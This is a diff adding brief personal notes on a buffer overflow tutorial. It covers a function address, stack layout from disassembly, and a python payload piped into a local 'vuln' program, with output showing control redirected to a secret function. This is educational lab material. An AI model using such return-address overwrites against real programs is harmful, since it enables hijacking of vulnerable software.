@@ -1,0 +1,22 @@
+#From blog - https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/
+
+
+- The address of secretFunction is 080484a6
+
+- The local variable of echo are,
+
+210  5dd:   83 ec 24                sub    $0x24,%esp
+0x24 is 36 decimal bytes are reserved for local variable of echo ().
+
+- lea    -0x1c(%ebp),%eax
+
+- python -c 'print "a"*32 + "\xa6\x84\x04\x08"' | ./vuln
+
+[parinay@ada ~/code/buffoverflow]:-python -c 'print "a"*32 + "\xa6\x84\x04\x08"' | ./vuln
+Enter some text:
+You entered: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��
+Congratulations!
+You have entered in the secret function!
+Segmentation fault (core dumped)
+[parinay@ada ~/code/buffoverflow]:-
+
